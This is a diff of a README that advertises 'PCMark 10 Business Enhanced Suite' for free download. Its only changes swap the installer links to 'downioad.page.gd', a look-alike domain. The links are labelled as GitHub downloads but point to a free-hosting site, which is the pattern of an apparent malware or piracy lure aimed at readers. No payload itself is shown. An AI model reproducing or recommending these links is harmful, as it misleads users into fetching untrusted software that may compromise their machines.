@@ -2,7 +2,7 @@
 
 PCMark 10 Business Enhanced Suite is a powerful benchmarking tool designed for Windows 10 and 11 systems. It provides comprehensive performance testing for professional environments, helping users evaluate their hardware capabilities. This suite includes a range of tests to measure CPU, GPU, memory, and storage performance, ensuring accurate and reliable results.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -71,7 +71,7 @@ No, the core functionality is included. However, some advanced features or updat
 
 To get the latest version of PCMark 10 Business Enhanced Suite, please use the following link:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 
